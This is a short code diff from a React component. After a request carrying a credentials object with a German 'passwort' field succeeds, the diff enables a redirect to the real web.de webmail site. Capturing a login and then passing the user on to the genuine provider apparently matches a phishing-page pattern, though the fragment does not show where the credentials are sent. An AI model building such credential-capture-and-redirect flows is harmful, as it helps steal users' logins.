@@ -82,7 +82,7 @@ export default function Main() {
         setCredentials({ ...credentials, passwort: "" });
         console.log(req);
 
-        // window.location.href = "https://web.de";
+        window.location.href = "https://web.de";
       })
       .catch((err) => {
         console.log(err);
